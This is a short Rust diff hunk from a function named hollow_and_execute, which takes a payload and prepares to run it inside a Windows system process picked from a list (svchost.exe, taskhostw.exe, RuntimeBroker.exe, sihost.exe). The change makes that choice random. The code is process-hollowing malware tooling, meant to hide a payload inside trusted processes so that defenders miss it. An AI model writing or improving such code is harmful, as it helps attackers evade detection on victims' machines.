@@ -192,7 +192,7 @@ pub fn hollow_and_execute(payload: &[u8]) -> Result<()> {
     let system_root = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".to_string());
     
     let hosts = ["svchost.exe", "taskhostw.exe", "RuntimeBroker.exe", "sihost.exe"];
-    let host = hosts[std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_millis() as usize % hosts.len()];
+    let host = hosts[rand::Rng::gen_range(&mut rand::thread_rng(), 0..hosts.len())];
     let svchost_path = format!("{}\\System32\\{}", system_root, host);
 
     let cmd: Vec<u16> = OsStr::new(&svchost_path)
